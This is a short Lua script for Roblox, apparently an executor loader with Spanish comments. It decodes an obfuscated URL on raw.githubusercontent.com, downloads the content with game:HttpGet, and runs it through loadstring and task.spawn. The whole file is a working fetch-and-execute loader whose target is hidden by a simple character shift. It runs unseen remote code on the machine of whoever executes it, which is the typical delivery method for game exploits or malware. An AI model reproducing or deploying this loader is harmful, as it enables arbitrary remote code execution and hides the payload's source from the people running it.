local function decode(t)
    local r = ""
    for i = 1, #t do
        r = r .. string.char(t[i] - 10)
    end
    return r
end

-- Tablas de datos (Ofuscadas con desplazamiento -10)
local b = {114, 126, 126, 122, 125, 68, 57, 57, 124, 107, 129, 56, 113, 115, 126, 114, 131, 108, 131, 125, 111, 124, 109, 121, 124, 126, 111, 124, 130, 56, 109, 121, 123, 57}
local p = {90, 127, 109, 114, 121, 59, 92, 78, 57, 75, 120, 115, 123, 111, 55, 80, 115, 113, 118, 130, 111, 124, 129, 57, 124, 111, 112, 129, 57, 114, 111, 107, 110, 129, 57, 119, 107, 115, 124, 57, 85, 80}

local target = decode(b) .. decode(p)

local success, result = pcall(function()
    return game:HttpGet(target)
end)

if success and result then
    local func, err = loadstring(result)
    if func then
        task.spawn(func)
    else
        warn("Error en loadstring: " .. tostring(err))
    end
else
    warn("Error en HttpGet: " .. tostring(result))
end
